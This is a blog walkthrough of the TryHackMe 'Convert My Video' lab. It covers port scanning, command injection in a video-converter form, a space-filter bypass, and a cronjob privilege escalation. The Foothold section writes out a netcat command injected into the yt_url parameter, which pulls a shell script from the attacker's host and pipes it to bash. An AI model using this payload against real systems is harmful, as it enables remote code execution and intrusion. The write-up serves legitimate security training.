---
title: "TryHackMe - Convert My Video"
author: Nasrallah
description: ""
date: 2023-02-27 00:00:00 +0000
categories : [TryHackMe]
tags: [tryhackme, linux, easy, cronjob, commandinjection]
img_path: /assets/img/tryhackme/convertmyvideo
---

<div align="center"> <script src="https://tryhackme.com/badge/367641"></script> </div>

---


# **Description**

Hello hackers, I hope you are doing well. We are doing [Convert My Video](https://tryhackme.com/room/convertmyvideo) from [TryHackMe](https://tryhackme.com).

# **Enumeration**

## nmap

We start a nmap scan using the following command: `sudo nmap -sC -sV -T4 {target_IP}`.

- -sC: run all the default scripts.

- -sV: Find the version of services running on the target.

- -T4: Aggressive scan to provide faster results.


```terminal
Nmap scan report for 10.10.140.178
Host is up (0.12s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 65:1b:fc:74:10:39:df:dd:d0:2d:f0:53:1c:eb:6d:ec (RSA)
|   256 c4:28:04:a5:c3:b9:6a:95:5a:4d:7a:6e:46:e2:14:db (ECDSA)
|_  256 ba:07:bb:cd:42:4a:f2:93:d1:05:d0:b3:4c:b1:d9:b1 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

There are two open ports

 - 22 OpenSSH

 - 80 Apache http web server


## Web

Let's navigate to the web page.

![](1.png)

Here we have an application that converts youtube videos to mp3.

Let's submit something and see what happens.

![](2.png)

We got a error message, let's check the request/response in burp suite.

![](3.png)

The text we submit get added to the string `https%3A%2F%2Fwww.youtube.com%2Fwatch%3Fv%3D` and gets send in the parameter `yt_url` using a POST request.

Let's test for command injection.

![](4.png)

The application is vulnerable through `yt_url` parameter.

# **Foothold**

Time for a reverse shell but first, i tried running commands that contains spaces like `uname -a` and didn't get the result back so we need to bypass this using `${IFS}`.

For the reverse shell, i setup a netcat listener and fed a reverse shell to it.

```bash
nc -lvnp 1234 < shell.sh
```

Then i setup another netcat listener to receive the shell.

After using the command injection vulnerability, i connected to the first listener and piped it to bash.

```bash
nc${IFS}10.11.14.124${IFS}1234|bash
```

![](5.png)


![](6.png)

We got the shell.

# **Privilege Escalation**

On `/var/www/html/tmp/` i found a file called `clean.sh`, so i thought there might be a cronjob running it.

I uploaded a copy of `pspy64` and listened for running processes.

![](7.png)

Indeed there is a cronjob, let's edit the clean.sh file to get root.

![](8.png)

---

Thank you for taking the time to read my write-up, I hope you have learned something from this. If you have any questions or comments, please feel free to reach out to me. See you in the next hack :).

---

# References
